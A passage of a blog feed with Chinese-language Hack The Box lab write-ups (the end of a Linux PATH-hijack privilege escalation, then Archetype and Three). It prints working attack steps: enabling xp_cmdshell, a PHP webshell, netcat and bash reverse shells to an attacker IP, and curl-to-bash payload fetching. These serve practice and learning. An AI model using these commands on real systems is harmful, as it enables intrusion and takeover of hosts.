用户名（Username）：这是用户的登录名，例如 `root` 或 `user1`。<br><br># 密码（Password）：通常是加密的用户密码。但在大多数现代系统中，实际的密码通常存储在 `/etc/shadow` 文件中，而不是 `/etc/passwd`。在旧的系统中，这里可能直接保存加密后的密码（如 `x` 或 `*`）。<br><br># 用户ID（UID）：用户的唯一数字标识符。每个用户都有一个唯一的 UID，`root` 用户通常是 UID <span class="hljs-number">0</span>。<br>    <br># 组ID（GID）：该用户的主组的 GID。每个用户属于一个默认的主组（通常与用户名相同），并且可能属于其他附加组。<br>    <br># 注释（GECOS）：这通常用于存储关于用户的额外信息，如全名、电话号码等。很多系统中，这个字段也可以为空。<br>    <br># 主目录（Home Directory）：用户登录后默认进入的目录。例如，`/home/user1` 是用户 `user1` 的主目录。如果该字段为空，通常表示该用户没有指定的主目录。<br>    <br># 登录Shell（Login Shell）：用户登录后使用的 shell。常见的 shell 如 `/bin/bash`、`/bin/sh` 等。对于不需要登录的用户，可能会设置为 `/sbin/nologin` 或 `/bin/<span class="hljs-literal">false</span>`。<br></code></pre></td></tr></table></figure><p>执行 <code>cat /etc/passwd</code>，发现了两个需要登录的用户：</p><p><img src="/../images/Pasted%20image%2020241219163000.png"></p><p>切换到 &#x2F;home&#x2F;robert，发现 user flag:</p><p><img src="/../images/Pasted%20image%2020241219163253.png"></p><h2 id="Root-flag"><a href="#Root-flag" class="headerlink" title="Root flag"></a>Root flag</h2><p>接下来尝试能否切换为 robert 用户。首先要找到登录密码。网站服务器是 Apache，其文件通常托管在 <code>/var/www/html/</code> 下，在此目录找到了数据库文件 db.php：</p><p><img src="/../images/Pasted%20image%2020241219180418.png"></p><p> <code>su robert</code>切换为 robert 用户，出现错误：</p><p><img src="/../images/Pasted%20image%2020241219181328.png"></p><p>因为我们使用的是一个 php shell，不能算作终端。使用以下命令升级 shell：</p><figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">SHELL</span>=/bin/bash<span class="hljs-built_in"> script </span>-q /dev/<span class="hljs-literal">null</span><br>stty<span class="hljs-built_in"> raw </span>-echo<br>reset<br>xterm<br></code></pre></td></tr></table></figure><p>登录成功：</p><p><img src="/../images/Pasted%20image%2020241219182527.png"></p><p>使用 <code>id</code> 命令用于显示当前用户 ID（UID）、组 ID（GID）以及所属的附加组（group）：</p><p><img src="/../images/Pasted%20image%2020241219183005.png"></p><p>观察到用户 robert 属于组 bugtracker 。group（组） 是 Linux 系统中用于管理用户权限的一种机制，可以让一组用户共享相同的访问权限。</p><p>查看属于该组的所有文件：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><code class="hljs arcade"><span class="hljs-built_in">find</span> / -group bugtracker <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><p>只有一个 <code>bugtracker</code> 文件：</p><p><img src="/../images/Pasted%20image%2020241219184553.png"></p><p>执行以下命令查看文件的详细信息及类型：</p><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">ls -la <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/bugtracker &amp;&amp; file /u</span>sr<span class="hljs-regexp">/bin/</span>bugtracker<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241219185502.png"></p><p>这里需要了解有关 SUID（Set owner User ID）的知识。</p><p>在 Unix&#x2F;Linux 系统中，SUID 是一种文件权限设置。当一个<strong>二进制程序（可执行文件）</strong>具有 SUID 权限时，它在执行时将<strong>继承文件所有者的权限</strong>，而不是执行该程序的用户的权限。它的设置通常用来允许普通用户以其他用户的权限（比如 root）来执行某些特定程序，而不需要更高的权限。</p><p>执行这个文件：</p><p><img src="/../images/Pasted%20image%2020241219192826.png"></p><p>发现该工具接受用户输入作为 <code>cat</code> 命令读取的文件的名称。但是这个 <code>cat</code> 不是一个绝对路径，所以我们可以插入我们自己构造的 <code>cat</code> 并将其添加到路径中，这样那个 <code>cat</code> 就会以 root 身份执行。</p><p>要获取 shell，我们需要打开 <code>/bin/sh</code>，由于 <code>bugtracker</code> 文件以 root 身份执行，因此这将创建一个 root shell。但是不能直接写入 <code>/usr/bin</code>，因为 robert 没有权限。可以把它写在 <code>/tmp</code>下：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">Filename: <span class="hljs-built_in">cat</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Location: /tmp</span><br>/bin/sh<br></code></pre></td></tr></table></figure><p>这里用 vi 和 vim 都没写成功，最后用 echo 成功了。</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;/bin/sh&#x27;</span> &gt; <span class="hljs-built_in">cat</span><br></code></pre></td></tr></table></figure><p>给 cat 添加执行权限：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x <span class="hljs-built_in">cat</span><br></code></pre></td></tr></table></figure><p>为了执行这个 <code>cat</code>命令，需要将 &#x2F;tmp 目录添加到 PATH 环境变量中：</p><figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">PATH</span>=/tmp:$PATH<br></code></pre></td></tr></table></figure><p>检查环境变量：</p><p><img src="/../images/Pasted%20image%2020241219204609.png"></p><p>再次运行 bugtracker, 此时以获取了 root 权限。<br><img src="/../images/Pasted%20image%2020241219205012.png"></p><p>找到 root flag:</p><p><img src="/../images/Pasted%20image%2020241219205247.png"></p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>本以为这个靶场会做得比较快，大大高估自己了。不过了解到了一些以前从未涉及过的思路，对 Linux 命令和文件系统也更加熟悉了。但是有些知识还是记不住，博客写完了不能就放那不看了，还是得经常回顾。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;在寻找 WEB 漏洞时，始终要检查cookie、sessio</summary>
      
    
    
    
    
    <category term="HackTheBox" scheme="http://example.com/tags/HackTheBox/"/>
    
  </entry>
  
  <entry>
    <title>Hack The Box-Archetype</title>
    <link href="http://example.com/2024/12/17/Hack-The-Box-Archetype/"/>
    <id>http://example.com/2024/12/17/Hack-The-Box-Archetype/</id>
    <published>2024-12-17T02:01:40.000Z</published>
    <updated>2024-12-21T10:14:46.177Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>通过这篇博客，你会了解到 SMB 协议、smbclient 命令、Microsoft SQL Server 、Impacket工具、xp_cmdshell命令、winPEAS工具、windows权限提升等知识，并对 nmap 和反弹 shell 的使用更加娴熟。</p><h1 id="Write-up"><a href="#Write-up" class="headerlink" title="Write-up"></a>Write-up</h1><h2 id="User-flag"><a href="#User-flag" class="headerlink" title="User flag"></a>User flag</h2><p>nmap 扫描目标主机端口：</p><p><img src="/../images/Pasted%20image%2020241217101741.png"></p><p>我们发现 SMB 端口是开放的，并且 Microsoft SQL Server 2017 正在端口 1433 上运行。</p><ul><li><strong>SMB</strong><ul><li>SMB（Server Message Block）是一种网络文件共享协议，常用于 Windows 操作系统中，用于允许应用程序读取和写入远程计算机上的文件以及请求计算机上的服务。SMB 协议不仅支持文件共享，还支持打印机共享、网络浏览等功能。</li><li>SMB 主要通过端口 <strong>445</strong> 进行通信。</li></ul></li></ul><p>使用 smbclient 与运行 SMB 协议的远程服务器进行交互：</p><figure class="highlight 1c"><table><tr><td class="code"><pre><code class="hljs 1c">smbclient <span class="hljs-punctuation">-</span>N <span class="hljs-punctuation">-</span>L <span class="hljs-comment">//10.129.111.223</span><br><span class="hljs-meta">#-N : 以匿名身份登录，不需要密码。</span><br><span class="hljs-meta">#-L : 列出目标主机上的所有共享资源。</span><br><span class="hljs-meta"># `<span class="hljs-comment">//` 明确指出你要访问的是网络共享，而不是本地路径。</span></span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241217105806.png"></p><p>尝试访问 backups：</p><figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">smbclient</span> //<span class="hljs-number">10.129.111.223</span>/backups<br></code></pre></td></tr></table></figure><p>输入 dir 命令列出当前目录中的文件和文件夹：</p><p><img src="/../images/Pasted%20image%2020241217110650.png"></p><p> prod.dtsConfig 看起来像是一个配置文件。使用 get 命令将其下载到本地计算机：</p><p><img src="/../images/Pasted%20image%2020241217110859.png"></p><p>文件内容如下:</p><p><img src="/../images/Pasted%20image%2020241217111114.png"></p><p>我们发现了主机 ARCHETYPE 上用户 sql_svc 的密码。接下来尝试连接 MSSQL 服务器。</p><p><a href="https://github.com/SecureAuthCorp/impacket">Impacket</a>工具中的 <strong>mssqlclient.py</strong> 可以提供此服务：</p><figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">python3</span> mssqlclient.py ARCHETYPE/sql_svc@<span class="hljs-number">10.129.111.223</span> -windows-auth<br></code></pre></td></tr></table></figure><p>成功连接Microsoft SQL Server：</p><p><img src="/../images/Pasted%20image%2020241217123244.png"></p><p>有关 MSSQL Server 的渗透技巧可以看这篇文章： <a href="https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server">https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server</a></p><p>默认情况下，<code>xp_cmdshell</code> 被禁用，因为它允许执行操作系统命令，这可能带来安全风险。所以首先需要启用 <code>xp_cmdshell</code> ：</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql"># <span class="hljs-keyword">Check</span> <span class="hljs-keyword">if</span> xp_cmdshell <span class="hljs-keyword">is</span> enabled<br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> sys.configurations <span class="hljs-keyword">WHERE</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>;<br><br># This turns <span class="hljs-keyword">on</span> advanced <span class="hljs-keyword">options</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">is</span> needed <span class="hljs-keyword">to</span> configure xp_cmdshell<br>sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span><br>RECONFIGURE<br><br><span class="hljs-meta">#This enables xp_cmdshell</span><br>sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span><br>RECONFIGURE<br></code></pre></td></tr></table></figure><p>尝试下 whoami 命令：</p><p><img src="/../images/Pasted%20image%2020241217125802.png"></p><p>因为 windows 操作系统没有内置 netcat ，所以我们要想办法让它安装一个 nc 。</p><p>首先在本机下载 nc64.exe，并在8000端口开启一个 http. server。注意把 nc64.exe放在执行 http. server 命令的目录下。</p><p><img src="/../images/Pasted%20image%2020241217132634.png"></p><p>接下来在 MSSQL Server 这边查看当前所处文件位置：</p><figure class="highlight autohotkey"><table><tr><td class="code"><pre><code class="hljs autohotkey">EXEC xp_cmdshell <span class="hljs-string">&quot;powershell -c pwd&quot;</span><br># `pwd` 是 PowerShell 的一个命令，而不是 cmd.exe 中的命令。<br># `powershell -c` 表示启动 PowerShel<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241217135009.png"></p><p>作为用户 sql_svc ，没有权限在系统目录中上传文件。根据对 windows 系统的了解，可以在 <code>C:\Users\&lt;username&gt;\Downloads</code> 存放下载的文件。接下来在这个文件夹下，执行下载 nc64.exe 的命令：</p><figure class="highlight hsp"><table><tr><td class="code"><pre><code class="hljs hsp"><span class="hljs-keyword">EXEC</span> xp_cmdshell <span class="hljs-string">&quot;powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.16.8:8000/nc64.exe&quot;</span><br></code></pre></td></tr></table></figure><p>由于对命令行工具的不熟悉，这里一开始用的是 curl 命令。后面无法执行反弹 shell ，发现Downloads 文件夹内没有 nc64.exe。改为 wget 命令后成功下载。</p><ul><li>区别：<ul><li>**<code>wget</code>**：会根据 URL 自动保存文件。可以使用 <code>-O</code> 参数指定保存的文件名。</li><li>**<code>curl</code>**：默认输出内容到终端，如果要将下载的文件保存到本地，需要使用 <code>-O</code>  参数。</li><li>如果只是需要下载文件，**<code>wget</code>** 是更好的选择。</li><li>如果需要与服务器进行更复杂的交互，发送 HTTP 请求、处理表单数据、上传文件等，**<code>curl</code>** 更适合。</li></ul></li></ul><p>在 http.server 处看到目标服务器已经执行了这个命令。</p><p><img src="/../images/Pasted%20image%2020241217141433.png"></p><p>接下来就是常规的反弹 shell 了。</p><p>本机开放8888端口监听：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">8888</span><br></code></pre></td></tr></table></figure><p>目标服务器执行以下命令，通过 nc 将 cmd.exe 绑定到我们的监听端口：</p><figure class="highlight dos"><table><tr><td class="code"><pre><code class="hljs dos">EXEC xp_cmdshell &quot;powershell -c <span class="hljs-built_in">cd</span> C:\Users\sql_svc\Downloads; .\nc64.exe -e <span class="hljs-built_in">cmd</span>.exe <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">16</span>.<span class="hljs-number">8</span> <span class="hljs-number">8888</span>&quot;<br></code></pre></td></tr></table></figure><p>在用户的 Desktop 文件找到 flag：</p><p><img src="/../images/Pasted%20image%2020241217152043.png"></p><h2 id="Root-flag"><a href="#Root-flag" class="headerlink" title="Root flag"></a>Root flag</h2><p>接下来需要找到管理员的 flag，涉及到 Windows 权限提升，可以利用工具<a href="https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe">winPEAS</a>，搜索在 Windows 主机上提升权限的可能路径。</p><p>将 winPEASx64.exe 下载到目标服务器：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 本机：</span><br><span class="hljs-attribute">python3</span> -m http.server <span class="hljs-number">8000</span><br><br><span class="hljs-comment"># 目标服务器首先执行 PoweShell ，然后执行 wget 命令：</span><br><span class="hljs-attribute">powershell</span> <br><span class="hljs-attribute">Invoke</span>-WebRequest -Uri http://<span class="hljs-number">10.10.16.8:8000</span>/winPEASx64.exe -O <span class="hljs-string">&quot;winPEASx64.exe&quot;</span> -UseBasicParsing<br></code></pre></td></tr></table></figure><p>这里尝试了 wget ，curl 和PowerShell 自带的 <code>Invoke-WebRequest</code>都失败了，错误提示：</p><figure class="highlight applescript"><table><tr><td class="code"><pre><code class="hljs applescript">wget : The response content cannot be parsed because <span class="hljs-keyword">the</span> Internet Explorer engine <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> available, <span class="hljs-keyword">or</span> Internet Explorer&#x27;s <span class="hljs-keyword">first</span>-<span class="hljs-built_in">launch</span> configuration <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> complete. Specify <span class="hljs-keyword">the</span> UseBasicParsing parameter <span class="hljs-keyword">and</span> <span class="hljs-keyword">try</span> again.<br></code></pre></td></tr></table></figure><p>这是因为在 PowerShell 中，默认使用 Internet Explorer（IE）作为内容解析引擎，但在某些环境中，IE 可能不可用或没有完全配置。这导致无法解析下载的内容。PowerShell 7 以上版本通常不再依赖于 IE 引擎。</p><p>解决办法是使用<code>-UseBasicParsing</code> 参数，让 PowerShell 使用基本的 HTML 解析方式，而不是依赖 IE 引擎。</p><p>执行 <strong>winPEASx64.exe</strong>：</p><figure class="highlight livescript"><table><tr><td class="code"><pre><code class="hljs livescript">PS C:<span class="hljs-string">\Users\sql_svc\Downloads&gt;</span> .<span class="hljs-string">\winPEASx64.exe</span><br></code></pre></td></tr></table></figure><p>从输出的报告可以看到：</p><p><img src="/../images/Pasted%20image%2020241217175322.png"></p><p>当前用户拥有[ SeImpersonatePrivilege 权限](<a href="https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege">SeImpersonatePrivilege and SeCreateGlobalPrivilege - Windows Server | Microsoft Learn</a>)。这个权限可能被 [Juicy Potato](<a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato">多汁土豆 |黑客技巧 — JuicyPotato | HackTricks</a>)利用。此处待日后展开讨论。</p><p>由于当前是一个普通用户账户，同时也是一个服务账户（为某些服务或应用程序运行而创建的账户），因此值得检查一下是否有经常访问的文件或执行的命令。</p><p>在 Windows 系统中，PowerShell 会记录用户执行的命令历史，类似于 Linux 中的 <code>.bash_history</code>。历史记录文件 <strong>ConsoleHost_history.txt</strong> 存储在 <code>C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\</code> 目录下。</p><p>查看这个文件，我们以明文形式获得了管理员用户的密码，该密码为 MEGACORP_4dm1n！！</p><p><img src="/../images/Pasted%20image%2020241217181120.png"></p><p>因为目标主机并没有开放ssh端口，此时我们可以再次使用 Impacket 工具中的 <strong>psexec.py</strong> 工具，以管理员身份获取 shell。</p><figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">python3</span> psexec.py administrator@<span class="hljs-number">10.129.111.223</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241217182129.png"></p><p>在管理员的 Desktop 文件找到 flag：</p><p><img src="/../images/Pasted%20image%2020241217182813.png"></p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>这个靶场是目前三个里面花的时间最长的，因为涉及到权限提升，不仅要找到用户 flag，还要找到管理员 flag 。实际上，这个过程中并没有涉及到 Windows 权限提升，而是通过记录 PoweShell 的文件找到了管理员的密码。关于权限提升，目前是一窍不通，以后遇到相关靶场再详细记录。通过三个靶场的练习，一些重复的知识我已经完全掌握了。这是一个良好的开端，日后会坚持刷题的。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;通过这篇博客，你会了解到 SMB 协议、smbclient </summary>
      
    
    
    
    
    <category term="HackTheBox" scheme="http://example.com/tags/HackTheBox/"/>
    
  </entry>
  
  <entry>
    <title>Hack The Box-Three</title>
    <link href="http://example.com/2024/12/14/Hack%20The%20Box-Three/"/>
    <id>http://example.com/2024/12/14/Hack%20The%20Box-Three/</id>
    <published>2024-12-14T04:52:06.000Z</published>
    <updated>2024-12-14T15:02:39.473Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>在信息收集过程中，使用 gobuster 爆破子域名，发现该网站使用 AWS S3 bucket作为其云存储设备。利用配置不当的 S3 bucket，上传后门到网站根目录。在本地主机编写一个反弹shell脚本，启动一个 Web 服务器并开启一个监听端口。然后浏览器访问相应的 URL，让目标主机获取并执行反弹shell，最终获取目标主机的控制权。</p><h1 id="Write-up"><a href="#Write-up" class="headerlink" title="Write-up"></a>Write-up</h1><p>首先，nmap扫描开放端口：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> nmap -p- --min-rate <span class="hljs-number">1000</span> -sV <span class="hljs-number">10.129.160.174</span><br></code></pre></td></tr></table></figure><p>发现操作系统是Linux，有两个端口开放：22(ssh)和80(http):</p><p><img src="/../images/Pasted%20image%2020241214131020.png"></p><p>访问 <a href="http://10.129.27.203/">http://10.129.27.203</a> :</p><p><img src="/../images/Pasted%20image%2020241214131419.png"></p><p>contact页面发现一个子域名：</p><p><img src="/../images/Pasted%20image%2020241214131643.png"></p><p>通常，不同的子域名会对应不同的 IP 地址。但是也可以由同一台服务器处理多个子域名。这种情况下，服务器通过 HTTP 请求中的 <code>Host</code> 头来确定应该由哪个应用程序处理该请求。现在我们有域名thetoppers.htb ，接下来尝试寻找同一服务器的其他子域名。</p><p>主机在向 DNS 服务器查询前，会先检查本地 hosts 文件中是否已存在目标主机名的映射关系。所以我们首先需要通过 <code>/etc/hosts</code> 将 thetoppers.htb 手动映射到靶机的 IP 地址：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;10.129.27.203 thetoppers.htb&quot;</span> | <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">tee</span> -a /etc/hosts<br></code></pre></td></tr></table></figure><ul><li><strong>gobuster</strong><ul><li>基本用法：<ol><li>目录爆破：<code>gobuster dir -u http://example.com -w /path/to/wordlist.txt</code></li><li>子域名爆破：<code>gobuster dns -d example.com -w /path/to/wordlist.txt</code></li><li>虚拟主机枚举：<code>gobuster vhost -u http://example.com -w /path/to/wordlist.txt</code></li><li>S3 存储桶枚举：<code>gobuster s3 -w /path/to/wordlist.txt</code></li><li>自定义头部：<code>gobuster dir -u http://example.com -w /path/to/wordlist.txt -H &quot;Authorization: Bearer TOKEN&quot;</code></li></ol></li><li>dns 模式只能通过 DNS 记录来发现子域名，如果目标服务器没有配置 DNS 记录，或者目标子域没有公开的 DNS 记录，那么使用 dns 模式就无法发现这些子域。</li><li>vhost 模式通过尝试发送多个带有不同 Host 头的 HTTP 请求来模拟访问不同的虚拟主机，目的是查找由同一 IP 地址托管的多个虚拟主机（子域）。</li></ul></li></ul><p>接下来使用 gobuster 爆破子域名：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">gobuster vhost -u http://thetoppers.htb -w Desktop/fuzzDicts/subdomainDicts/main.txt<br></code></pre></td></tr></table></figure><p>结果显示存在一个名为 s3.thetoppers.htb 的子域名，在 &#x2F;etc&#x2F;hosts 文件中为此子域名也添加一个条目：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;10.129.27.203 s3.thetoppers.htb&quot;</span> | <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">tee</span> -a /etc/hosts<br></code></pre></td></tr></table></figure><p>访问这个子域名：</p><p><img src="/../images/Pasted%20image%2020241214175016.png"></p><p>Amazon S3 是一种基于云的对象存储服务（OSS），它使用 buckets 作为存储容器，类似于文件夹。使用场景包括备份和存储、媒体托管、软件交付、静态网站托管等。我们可以借助 <strong>awscli</strong> 与 S3 buckets进行交互。 </p><p>首先，设置其所有字段为任意值：</p><p><img src="/../images/Pasted%20image%2020241214175627.png"></p><p>使用 ls 命令列出服务器托管的所有 S3 buckets：</p><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><code class="hljs jboss-cli">aws <span class="hljs-params">--endpoint=http</span>:<span class="hljs-string">//s3.thetoppers.htb</span> s3 <span class="hljs-keyword">ls</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241214175904.png"></p><p>然后查看指定 bucket 内的对象和公共前缀（PRE，类似文件夹）：</p><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><code class="hljs jboss-cli">aws <span class="hljs-params">--endpoint=http</span>:<span class="hljs-string">//s3.thetoppers.htb</span> s3 <span class="hljs-keyword">ls</span> s3:<span class="hljs-string">//thetoppers.htb</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241214180409.png"></p><p>在 thetoppers.htb 这个bucket内，我们看到了一个名为 &#x2F;images的文件夹，一个.htaccess(Apache 服务器的配置文件)和一个index.php，这符合网站根目录的文件结构。</p><p>awscli 允许上传文件到 S3 bucket，我们随意上传一个文件作测试：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">aws --endpoint=http://s3.thetoppers.htb s3 <span class="hljs-built_in">cp</span> Desktop/hash.txt s3://thetoppers.htb<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241214183505.png"></p><p>浏览器访问 <a href="http://thetoppers.htb/hash.txt%EF%BC%9A">http://thetoppers.htb/hash.txt：</a></p><p><img src="/../images/Pasted%20image%2020241214185221.png"></p><p>发现上传到 S3 bucket的文件成功在浏览器上被显示出来了，由此分析该S3 bucket被用作网站的 <code>webroot</code>。根据这个漏洞，我们可以上传后门，获取网站的控制权。</p><p>我的Wappalyzer没分析出来网站用的什么编程语言，官方题解说是 PHP 。于是写一个 php 一句话木马：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>写入 shell.php 文件：</p><figure class="highlight php-template"><table><tr><td class="code"><pre><code class="hljs php-template"><span class="language-xml">echo &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>]); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot; &gt; shell.php</span><br></code></pre></td></tr></table></figure><p>上传 shell.php:</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">aws --endpoint=http://s3.thetoppers.htb s3 <span class="hljs-built_in">cp</span> Desktop/shell.php s3://thetoppers.htb<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241214184556.png"></p><p>这里在浏览器访问文件失败。查看 shell.php，发现文件内容变为：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>原因是 shell 对双引号内的内容会进行变量解析，而 <code>$_GET[&quot;cmd&quot;]</code> 被解释为一个尚未定义的变量（空值）。解决办法是将双引号改成单引号，单引号内部的内容不会被解析，因此可以正确保留 <code>$_GET[&quot;cmd&quot;]</code>：</p><figure class="highlight php-template"><table><tr><td class="code"><pre><code class="hljs php-template"><span class="language-xml">echo &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>]); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27; &gt; shell.php</span><br></code></pre></td></tr></table></figure><p>尝试使用 URL 参数 cmd 执行 OS 命令 id :</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">http://thetoppers.htb/shell.php?cmd=<span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241214190212.png"></p><p>证明已经成功上传后门。接下来就要想办法获取目标主机的控制权。</p><p>在实际场景中，很多内网机器并没有对外开放的端口供连接。而且目标主机通常位于受防火墙保护的内网环境中，无法直接通过正向连接访问。但目标机器可以主动发起出站连接，因为出站流量通常允许通过防火墙。这时就要用到反弹 shell 了。</p><p>创建一个 shell.sh，使用<a href="https://forum.ywhack.com/shell.php">[~]#棱角 ::Edge.Forum*</a>一键生成（一开始用的nc，失败了）：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span> -i &gt;&amp; /dev/tcp/<span class="hljs-number">10.10.16.8</span>/<span class="hljs-number">8888</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>本地主机开放8888端口监听：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">8888</span><br></code></pre></td></tr></table></figure><p>在本地主机 8000 端口上启动一个 Web 服务器：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> -m http.server <span class="hljs-number">8000</span><br></code></pre></td></tr></table></figure><p>在浏览器上使用 curl 命令从本地主机获取 shell.sh，然后将其通过管道传输到 bash 以执行它：</p><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">http</span>://thetoppers.htb/<span class="hljs-built_in">shell</span>.php?cmd=curl <span class="hljs-number">10.10</span><span class="hljs-number">.16</span><span class="hljs-number">.8</span>:<span class="hljs-number">8000</span>/<span class="hljs-built_in">shell</span>.sh|bash<br></code></pre></td></tr></table></figure><p>成功下载：</p><p><img src="/../images/Pasted%20image%2020241214223216.png"></p><p>监听端口显示连接成功，找到flag：</p><p><img src="/../images/Pasted%20image%2020241214223155.png"></p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>在这次靶场练习中，最大的收获是实际操作了以前学过的知识，比如上传后门和反弹shell。除此之外，又认识了一个渗透神器 gobuster，还了解了OSS，之前只听说过，但是没遇到过。在整个过程中，相对于以前的刷题过程，我多了些思考，并通过Chatgpt解决了疑惑，但是对一些命令还是不够熟练，以后再接再厉。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;在信息收集过程中，使用 gobuster 爆破子域名，发现该</summary>
      
    
    
    
    
    <category term="HackTheBox" scheme="http://example.com/tags/HackTheBox/"/>
    
  </entry>
  
  <entry>
    <title>Hack The Box-Responder</title>
